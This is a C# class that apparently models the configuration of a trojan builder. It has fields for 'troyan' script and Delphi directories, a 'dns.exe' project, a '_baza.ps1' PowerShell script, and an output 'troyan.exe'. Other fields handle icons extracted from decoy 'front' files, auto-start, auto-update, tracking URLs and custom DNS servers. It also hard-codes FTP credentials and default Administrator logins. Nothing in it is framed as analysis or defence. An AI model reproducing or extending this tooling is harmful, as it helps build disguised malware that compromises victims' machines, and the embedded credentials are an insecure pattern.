using System.Text.Json.Serialization;

namespace model
{

    public class ServerModel
    {
        // statics
        [JsonPropertyName("rootDir")] public string RootDir => ServerModelLoader.RootDirStatic;

        [JsonPropertyName("domainController")]
        public string DomainController => ServerModelLoader.DomainControllerStatic;

        [JsonPropertyName("cpDir")] public string CpDir => ServerModelLoader.CpDirStatic;
        [JsonPropertyName("certDir")] public string CertDir => ServerModelLoader.CertDirStatic;
        [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
        [JsonPropertyName("adsDir")] public string AdsDir => ServerModelLoader.AdsDirStatic;
        [JsonPropertyName("publishedAdsDir")] public string PublishedAdsDir => ServerModelLoader.PublishedAdsDirStatic;
        [JsonPropertyName("publishedDynamicDataDir")] public string PublishedDynamicDataDir => ServerModelLoader.PublishedDynamicDataDirStatic;
        [JsonPropertyName("updDir")] public string UpdDir => ServerModelLoader.UpdDirStatic;
        [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
        [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => ServerModelLoader.TroyanDelphiDirStatic;
        [JsonPropertyName("troyanDelphiExe")] public string TroyanDelphiExe => Path.Join(TroyanDelphiDir, "dns.exe");
        [JsonPropertyName("troyanDelphiProj")] public string TroyanDelphiProj => Path.Join(TroyanDelphiDir, "dns.dpr");
        [JsonPropertyName("troyanDelphiIco")] public string TroyanDelphiIco => Path.Join(TroyanDelphiDir, "_icon.ico");
        [JsonPropertyName("troyanDelphiScript")] public string TroyanDelphiScript => Path.Join(TroyanDelphiDir, "_baza.ps1");
        
        [JsonPropertyName("defaultIco")] public string DefaultIco => Path.Join(RootDir, "defaulticon.ico");

        // server-depended
        [JsonPropertyName("server")] public string Server { get; set; }
        [JsonPropertyName("userDataDir")] public string UserDataDir => @$"C:\data\{Server}";
        [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
        [JsonPropertyName("userDelphiExe")] public string UserDelphiPath => Path.Join(UserDataDir, "troyan.exe");
        [JsonPropertyName("userDelphiIco")] public string UserDelphiIco => Path.Join(UserDataDir, "server.ico");

        //FTP
        [JsonPropertyName("ftp")] public string Ftp => $@"ftp://ftpData:Abc12345!@{Server}";
        [JsonPropertyName("ftpAsHttp")] public string FtpAsHttp => $@"http://{Server}/ftp";
        
        
        //Update
        [JsonPropertyName("updateUrl")] public string UpdateUrl { get; set; }


        // properties
        [JsonPropertyName("login")] public string Login { get; set; }

        [JsonPropertyName("password")] public string Password { get; set; }

        [JsonPropertyName("primaryDns")] public string PrimaryDns { get; set; }

        [JsonPropertyName("secondaryDns")] public string SecondaryDns { get; set; }

        [JsonPropertyName("track")] public bool Track { get; set; }

        [JsonPropertyName("trackingUrl")] public string TrackingUrl { get; set; }

        [JsonPropertyName("autoStart")] public bool AutoStart { get; set; }

        [JsonPropertyName("autoUpdate")] public bool AutoUpdate { get; set; }

        [JsonPropertyName("domains")] public List<string> Domains { get; set; }

        [JsonPropertyName("interfaces")] public List<string> Interfaces { get; set; }

        [JsonPropertyName("ipDomains")] public Dictionary<string, string> IpDomains { get; set; }

        [JsonPropertyName("pushes")] public List<string> Pushes { get; set; }

        [JsonPropertyName("front")] public List<string> Front { get; set; }

        [JsonPropertyName("extractIconFromFront")]
        public bool ExtractIconFromFront { get; set; }

        [JsonPropertyName("embeddings")] public List<string> Embeddings { get; set; }


        //resulting
        [JsonPropertyName("adminServers")]
        [JsonIgnore]
        public Dictionary<string, string>? AdminServers { get; set; }

        [JsonPropertyName("adminPassword")]
        [JsonIgnore]
        public string AdminPassword { get; set; }

        [JsonIgnore] public string? Result { get; set; }

        [JsonPropertyName("isValid")] public bool IsValid { get; set; }

        //constructor
        public ServerModel()
        {
            IsValid = false;
            Server = "1.1.1.1";
            Login = "Administrator";
            Password = "password";
            Track = false;
            TrackingUrl = string.Empty;
            AutoStart = false;
            AutoUpdate = false;
            Domains = new List<string>();
            Interfaces = new List<string>();
            Pushes = new List<string>();
            IpDomains = new();
            Front = new List<string>();
            ExtractIconFromFront = false;
            Embeddings = new List<string>();
        }
    }
}